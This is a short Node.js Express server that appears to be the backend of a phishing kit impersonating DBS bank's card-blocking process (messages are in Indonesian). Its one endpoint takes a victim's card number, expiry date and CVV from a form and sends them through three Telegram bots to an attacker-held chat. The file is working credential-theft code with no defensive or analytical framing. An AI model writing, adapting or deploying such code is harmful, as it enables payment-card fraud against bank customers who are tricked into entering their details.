const express = require('express');
const fetch = require('node-fetch');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.post('/kirim-ke-telegram', async (req, res) => {
  const { nomor, valid, cvv } = req.body;

  const message = `🚫 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  const chat_id = process.env.CHAT_ID;

  const tokens = [
    process.env.BOT_TOKEN_1,
    process.env.BOT_TOKEN_2,
    process.env.BOT_TOKEN_3
  ];

  try {
    await Promise.all(tokens.map(token => {
      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
      });
    }));

    res.sendStatus(200);
  } catch (error) {
    res.status(500).send("Gagal kirim dari salah satu bot: " + error.message);
  }
});

app.listen(3000, () => {
  console.log("Server aktif di http://localhost:3000");
});
